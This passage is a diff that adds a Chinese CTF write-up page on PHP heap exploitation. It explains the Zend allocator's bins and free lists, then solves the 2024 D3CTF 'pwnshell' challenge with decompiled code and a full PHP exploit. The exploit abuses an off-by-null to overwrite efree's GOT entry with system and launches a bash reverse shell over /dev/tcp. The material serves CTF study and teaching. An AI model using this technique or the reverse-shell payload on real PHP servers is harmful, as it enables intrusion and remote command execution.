+	if (ZEND_DEBUG &amp;&amp; AG(mm_heap)-&gt;use_custom_heap == ZEND_MM_CUSTOM_HEAP_DEBUG) {
+		return AG(mm_heap)-&gt;custom_heap.debug._malloc(size ZEND_FILE_LINE_RELAY_CC ZEND_FILE_LINE_ORIG_RELAY_CC);
+	} else {
+		return AG(mm_heap)-&gt;custom_heap.std._malloc(size);
+	}
+}
+</code></pre>
+<p>在另一个分支 zend_mm_alloc_heap 中，通过比较大小来选择不同的分配方式。ZEND_MM_MAX_SMALL_SIZE 为 3072，ZEND_MM_MAX_LARGE_SIZE 为 2MB-4KB。这些题目中需要分配的大小基本都小于 3072。</p>
+<pre><code class="language-c">
+static zend_always_inline void *zend_mm_alloc_heap(zend_mm_heap *heap, size_t size ZEND_FILE_LINE_DC ZEND_FILE_LINE_ORIG_DC)
+{
+	void *ptr;
+
+	if (EXPECTED(size &lt;= ZEND_MM_MAX_SMALL_SIZE)) {
+		ptr = zend_mm_alloc_small(heap, ZEND_MM_SMALL_SIZE_TO_BIN(size) ZEND_FILE_LINE_RELAY_CC ZEND_FILE_LINE_ORIG_RELAY_CC);
+
+		return ptr;
+	} else if (EXPECTED(size &lt;= ZEND_MM_MAX_LARGE_SIZE)) {
+		ptr = zend_mm_alloc_large(heap, size ZEND_FILE_LINE_RELAY_CC ZEND_FILE_LINE_ORIG_RELAY_CC);
+
+		return ptr;
+	} else {
+
+		return zend_mm_alloc_huge(heap, size ZEND_FILE_LINE_RELAY_CC ZEND_FILE_LINE_ORIG_RELAY_CC);
+	}
+}
+</code></pre>
+<p>通过 ZEND_MM_SMALL_SIZE_TO_BIN(size) 获取所属 bin 的 idx。<a href="https://segmentfault.com/a/1190000018260140">https://segmentfault.com/a/1190000018260140</a></p>
+<pre><code class="language-c">if (EXPECTED(size &lt;= ZEND_MM_MAX_SMALL_SIZE)) {
+		ptr = zend_mm_alloc_small(heap, ZEND_MM_SMALL_SIZE_TO_BIN(size))
+		
+ZEND_MM_SMALL_SIZE_TO_BIN的转换规则如下
+if (size &lt;= 64) {
+		/* we need to support size == 0 ... */
+		return (size - !!size) &gt;&gt; 3; 
+	} else {
+		t1 = size - 1;
+		t2 = zend_mm_small_size_to_bit(t1) - 3;
+		t1 = t1 &gt;&gt; t2;
+		t2 = t2 - 3;
+		t2 = t2 &lt;&lt; 2;
+		return (int)(t1 + t2);
+	}
+	
+/* higher set bit number (0-&gt;N/A, 1-&gt;1, 2-&gt;2, 4-&gt;3, 8-&gt;4, 127-&gt;7, 128-&gt;8 etc) */
+static zend_always_inline int zend_mm_small_size_to_bit(int size)
+{
+#if (defined(__GNUC__) || __has_builtin(__builtin_clz))  &amp;&amp; defined(PHP_HAVE_BUILTIN_CLZ)
+	return (__builtin_clz(size) ^ 0x1f) + 1;
+#elif defined(_WIN32)
+	unsigned long index;
+
+	if (!BitScanReverse(&amp;index, (unsigned long)size)) {
+		/* undefined behavior */
+		return 64;
+	}
+
+	return (((31 - (int)index) ^ 0x1f) + 1);
+#else
+	int n = 16;
+	if (size &lt;= 0x00ff) {n -= 8; size = size &lt;&lt; 8;}
+	if (size &lt;= 0x0fff) {n -= 4; size = size &lt;&lt; 4;}
+	if (size &lt;= 0x3fff) {n -= 2; size = size &lt;&lt; 2;}
+	if (size &lt;= 0x7fff) {n -= 1;}
+	return n;
+#endif
+}		
+</code></pre>
+<p>各 idx 对应的大小如下：</p>
+<pre><code class="language-c">这里会根据idx得到对应的要分配的size大小
+
+```c
+static const uint32_t bin_data_size[] = {
+	ZEND_MM_BINS_INFO(_BIN_DATA_SIZE, x, y)
+};
+
+/* num, size, count, pages */
+#define ZEND_MM_BINS_INFO(_, x, y) \
+    _( 0,    8,  512, 1, x, y) \
+    _( 1,   16,  256, 1, x, y) \
+    _( 2,   24,  170, 1, x, y) \
+    _( 3,   32,  128, 1, x, y) \
+    _( 4,   40,  102, 1, x, y) \
+    _( 5,   48,   85, 1, x, y) \
+    _( 6,   56,   73, 1, x, y) \
+    _( 7,   64,   64, 1, x, y) \
+   
+    _( 8,   80,   51, 1, x, y) \
+    _( 9,   96,   42, 1, x, y) \
+    _(10,  112,   36, 1, x, y) \    
+    _(11,  128,   32, 1, x, y) \
+    
+    _(12,  160,   25, 1, x, y) \    
+    _(13,  192,   21, 1, x, y) \
+    _(14,  224,   18, 1, x, y) \    
+    _(15,  256,   16, 1, x, y) \
+    
+    _(16,  320,   64, 5, x, y) \    
+    _(17,  384,   32, 3, x, y) \
+    _(18,  448,    9, 1, x, y) \    
+    _(19,  512,    8, 1, x, y) \
+    
+    _(20,  640,   32, 5, x, y) \
+    _(21,  768,   16, 3, x, y) \
+    _(22,  896,    9, 2, x, y) \    
+    _(23, 1024,    8, 2, x, y) \
+    
+    _(24, 1280,   16, 5, x, y) \
+    _(25, 1536,    8, 3, x, y) \
+    _(26, 1792,   16, 7, x, y) \    
+    _(27, 2048,    8, 4, x, y) \
+    
+    _(28, 2560,    8, 5, x, y) \
+    _(29, 3072,    4, 3, x, y)
+
+#endif /* ZEND_ALLOC_SIZES_H */
+</code></pre>
+<pre><code>size 在 small 范围时进入该函数。如果对应的 bin 已初始化（不为 NULL），就按照类似 tcache 的方式分配；否则通过 zend_mm_alloc_small_slow 初始化，并返回第一个块。
+```c
+static zend_always_inline void *zend_mm_alloc_small(zend_mm_heap *heap, int bin_num ZEND_FILE_LINE_DC ZEND_FILE_LINE_ORIG_DC)
+{
+#if ZEND_MM_STAT
+	do {
+		size_t size = heap-&gt;size + bin_data_size[bin_num];
+		size_t peak = MAX(heap-&gt;peak, size);
+		heap-&gt;size = size;
+		heap-&gt;peak = peak;
+	} while (0);
+#endif
+
+	if (EXPECTED(heap-&gt;free_slot[bin_num] != NULL)) {
+		zend_mm_free_slot *p = heap-&gt;free_slot[bin_num];
+		heap-&gt;free_slot[bin_num] = p-&gt;next_free_slot;
+		return p;
+	} else {
+		return zend_mm_alloc_small_slow(heap, bin_num ZEND_FILE_LINE_RELAY_CC ZEND_FILE_LINE_ORIG_RELAY_CC);
+	}
+}
+</code></pre>
+<p>如果对应索引的 free_slot 尚未初始化，就在这里初始化：为当前 size 对应的 idx 分配若干页，再切分为单独的块，通过链表串起来，因此初始时它们在物理上相邻。</p>
+<pre><code class="language-c">
+static zend_never_inline void *zend_mm_alloc_small_slow(zend_mm_heap *heap, uint32_t bin_num ZEND_FILE_LINE_DC ZEND_FILE_LINE_ORIG_DC)
+{
+	zend_mm_chunk *chunk;
+	int page_num;
+	zend_mm_bin *bin;
+	zend_mm_free_slot *p, *end;
+
+	bin = (zend_mm_bin*)zend_mm_alloc_pages(heap, bin_pages[bin_num] ZEND_FILE_LINE_RELAY_CC ZEND_FILE_LINE_ORIG_RELAY_CC);
+
+	if (UNEXPECTED(bin == NULL)) {
+		/* insufficient memory */
+		return NULL;
+	}
+
+	chunk = (zend_mm_chunk*)ZEND_MM_ALIGNED_BASE(bin, ZEND_MM_CHUNK_SIZE);
+	page_num = ZEND_MM_ALIGNED_OFFSET(bin, ZEND_MM_CHUNK_SIZE) / ZEND_MM_PAGE_SIZE;
+	chunk-&gt;map[page_num] = ZEND_MM_SRUN(bin_num);
+	if (bin_pages[bin_num] &gt; 1) {
+		uint32_t i = 1;
+
+		do {
+			chunk-&gt;map[page_num+i] = ZEND_MM_NRUN(bin_num, i);
+			i++;
+		} while (i &lt; bin_pages[bin_num]);
+	}
+
+	/* create a linked list of elements from 1 to last */
+	end = (zend_mm_free_slot*)((char*)bin + (bin_data_size[bin_num] * (bin_elements[bin_num] - 1)));
+	heap-&gt;free_slot[bin_num] = p = (zend_mm_free_slot*)((char*)bin + bin_data_size[bin_num]);
+	do {
+		p-&gt;next_free_slot = (zend_mm_free_slot*)((char*)p + bin_data_size[bin_num]);
+		p = (zend_mm_free_slot*)((char*)p + bin_data_size[bin_num]);
+	} while (p != end);
+
+	/* terminate list using NULL */
+	p-&gt;next_free_slot = NULL;
+
+	/* return first element */
+	return bin;
+}
+</code></pre>
+<p>小块分配的释放过程，与 tcache 非常相似。</p>
+<pre><code class="language-c">static zend_always_inline void zend_mm_free_small(zend_mm_heap *heap, void *ptr, int bin_num)
+{
+	zend_mm_free_slot *p;
+
+#if ZEND_MM_STAT
+	heap-&gt;size -= bin_data_size[bin_num];
+#endif
+
+#if ZEND_DEBUG
+	do {
+		zend_mm_debug_info *dbg = (zend_mm_debug_info*)((char*)ptr + bin_data_size[bin_num] - ZEND_MM_ALIGNED_SIZE(sizeof(zend_mm_debug_info)));
+		dbg-&gt;size = 0;
+	} while (0);
+#endif
+
+	p = (zend_mm_free_slot*)ptr;
+	p-&gt;next_free_slot = heap-&gt;free_slot[bin_num];
+	heap-&gt;free_slot[bin_num] = p;
+}
+
+</code></pre>
+<h2 id="利用">利用</h2>
+<ul>
+<li>可以看到，这里没有对 fd 做任何检查，而且初始时各块在物理上相邻。</li>
+<li>如果存在溢出，就可以修改下一个 chunk 的 fd，实现任意地址分配。</li>
+<li>释放时也没有 double free 检查。</li>
+</ul>
+<h2 id="2024-d3ctf-pwnshell">2024 D3CTF pwnshell</h2>
+<p>发现反编译结果中某些函数缺少参数，需要修改函数定义，补上参数。</p>
+<pre><code class="language-c">
+Z zval**类型
+</code></pre>
+<p>然后找一个扩展库，找到该结构体的定义，并在 IDA 中创建结构体。
+这里存在 off by null。</p>
+<pre><code class="language-c">unsigned __int64 __fastcall zif_addHacker(__int64 a1, __int64 a2)
+{
+  __int64 index; // rbp
+  __int64 v3; // rdi
+  __int64 avai_index; // rdx
+  _BYTE *p_notexist; // rax
+  struct chunk *v7; // r12
+  struct chunk1 *chunk1; // rbx
+  void *chunk2; // rax
+  size_t size; // rdx
+  char *ptr; // rsi
+  struct _zval_struct *v12; // r13
+  size_t size_1; // rax
+  struct _zval_struct *arg2; // [rsp+8h] [rbp-40h] BYREF
+  struct _zval_struct *arg1; // [rsp+10h] [rbp-38h] BYREF
+  unsigned __int64 v16; // [rsp+18h] [rbp-30h]
+
+  v3 = *(unsigned int *)(a1 + 44);
+  v16 = __readfsqword(0x28u);
+  if ( (unsigned int)zend_parse_parameters(v3, &quot;zz&quot;, &amp;arg1, &amp;arg2) != -1 )// v13是第二个参数
+  {
+    if ( arg1-&gt;u1.v.type == 6 &amp;&amp; arg2-&gt;u1.v.type == 6 )
+    {
+      avai_index = 0LL;
+      p_notexist = &amp;chunkList[0].notexist;
+      while ( *p_notexist != 1 )
+      {
+        ++avai_index;
+        p_notexist += 16;
+        if ( avai_index == 16 )
+          goto LABEL_9;
+      }
+      index = avai_index;
+LABEL_9:
+      v7 = &amp;chunkList[index];
+      chunk1 = (struct chunk1 *)_emalloc((_QWORD *)(arg2-&gt;value.lval-&gt;len + 16));
+      chunk2 = (void *)_emalloc((_QWORD *)arg1-&gt;value.lval-&gt;len);
+      chunk1-&gt;chunk2_ptr = chunk2;
+      size = arg1-&gt;value.lval-&gt;len;
+      ptr = arg1-&gt;value.lval-&gt;val;
+      chunk1-&gt;chunk1_size = size;
+      memcpy(chunk2, ptr, size);
+      v12 = arg2;
+      memcpy(chunk1-&gt;chunk1_buf, arg2-&gt;value.lval-&gt;val, arg2-&gt;value.lval-&gt;len);
+      size_1 = v12-&gt;value.lval-&gt;len;
+      v7-&gt;chunk_ptr = chunk1;
+      v7-&gt;notexist = 13;
+      *((_BYTE *)chunk1-&gt;chunk1_buf + size_1) = 0;// off by null
+    }
+    else
+    {
+      *(_DWORD *)(a2 + 8) = 1;
+    }
+  }
+  return v16 - __readfsqword(0x28u);
+}
+</code></pre>
+<p><img src="/workspace/endpoint-security/ctf-and-pwn/challenge-writeups/CTF-PWN%EF%BC%9AWeb%20Pwn%20%E5%85%A5%E9%97%A8/assets/csdn-141128519/image-016-68261f3022.png" alt="图片"></p>
+<p>这里选择一个对应 bin 尚未初始化的大小，使取得的第一个块按页对齐，即低字节为零字节。
+随后，在第一次 addHacker 分配时，第一个 chunk 的零字节溢出会修改当前位于链表首部的 chunk 的 next 字段低字节。
+接着再次调用 addHacker，此次申请的第二个 chunk 会被分配到第一次分配时第一个 chunk 所在的位置。
+现在可以修改原先第一个 chunk 的 chunk2ptr 和 size（editHacker 需要使用），再将其覆盖为 efree 的 GOT 地址。
+随后使用 editHacker 将其改为 system。最后，通过 addHacker 将命令存入第二个申请的 chunk，再对最后一次 addHacker 的索引执行 removeHacker。</p>
+<h2 id="exp-1">exp</h2>
+<pre><code class="language-php">&lt;?php
+$heap_base = 0;
+$libc_base = 0;
+$libc = &quot;&quot;;
+$mbase = &quot;&quot;;
+
+function u64($leak){
+    $leak = strrev($leak);
+    $leak = bin2hex($leak);
+    $leak = hexdec($leak);
+    return $leak;
+}
+
+function p64($addr){
+    $addr = dechex($addr);
+    $addr = hex2bin($addr);
+    $addr = strrev($addr);
+    $addr = str_pad($addr, 8, &quot;\x00&quot;);
+    return $addr;
+}
+
+function leakaddr($buffer){
+    global $libc,$mbase;
+    $p = &#39;/([0-9a-f]+)\-[0-9a-f]+ .* \/usr\/lib\/x86_64-linux-gnu\/libc.so.6/&#39;;
+    $p1 = &#39;/([0-9a-f]+)\-[0-9a-f]+ .*  \/usr\/local\/lib\/php\/extensions\/no-debug-non-zts-20230831\/vuln.so/&#39;;
+    preg_match_all($p, $buffer, $libc);
+    preg_match_all($p1, $buffer, $mbase);
+    return &quot;&quot;;
+}
+
+function leak(){
+    global $libc_base, $module_base, $libc, $mbase;
+    ob_start();
+    include(&quot;/proc/self/maps&quot;);
+    $buffer = ob_get_contents();
+    ob_end_flush();
+    leakaddr($buffer);
+    $libc_base=hexdec($libc[1][0]);
+    $module_base=hexdec($mbase[1][0]);
+}
+
+function main(){
+    $cmd = &#39;bash -c &quot;bash -i &gt;&amp; /dev/tcp/127.0.0.1/6666 0&gt;&amp;1&quot;&#39;;
+    leak();
+    global $libc_base, $module_base;
+    addHacker(str_repeat(&quot;\x11&quot;, 0x8), str_repeat(&quot;\x11&quot;, 0x30));
+    addHacker(str_pad(p64($module_base + 0x4038).p64(0xff), 0x40, &quot;\x11&quot;);, str_repeat(&quot;\x11&quot;, 0x2f));
+    addHacker(str_pad($cmd, 0x40, &quot;\x00&quot;), &quot;1&quot;);
+    editHacker(0, p64($libc_base + 0x4c411););
+    removeHacker(2);
+}
+
+main();
+?&gt;
+
+</code></pre>
+
+    </article>
+    
+    <nav class="pn"><span></span><a href="/workspace/endpoint-security/ctf-and-pwn/challenge-writeups/HWS-CTF%20%E7%AC%AC7%E5%AD%A3%20%E5%B1%B1%E4%B8%9C%E5%A4%A7%E5%AD%A6%E7%AB%99-PWN-%5Binverse%5D/"><span class="l">下一篇</span>HWS-CTF 第7季 山东大学站-PWN-[inverse]</a></nav>
+  </main>
+  <aside class="toc"><div class="toc-h">目录</div><a class="d2" href="#搭建-php-环境">搭建 PHP 环境</a><a class="d2" href="#初始化扩展模块">初始化扩展模块</a><a class="d2" href="#编写扩展模块">编写扩展模块</a><a class="d2" href="#编译扩展模块">编译扩展模块</a><a class="d2" href="#测试">测试</a><a class="d2" href="#宿主机">宿主机</a><a class="d2" href="#docker">docker</a><a class="d2" href="#泄露-procselfmaps">泄露 /proc/self/maps</a><a class="d2" href="#利用溢出调用-mprotect-修改栈权限">利用溢出调用 mprotect 修改栈权限</a><a class="d2" href="#反弹-shell">反弹 shell</a><a class="d2" href="#exp">exp</a><a class="d2" href="#php-堆源码">PHP 堆源码</a><a class="d2" href="#利用">利用</a><a class="d2" href="#2024-d3ctf-pwnshell">2024 D3CTF pwnshell</a><a class="d2" href="#exp-1">exp</a></aside>
+</div>
+<script type="module" src="/blog/article.js"></script>
+</body>
+</html>
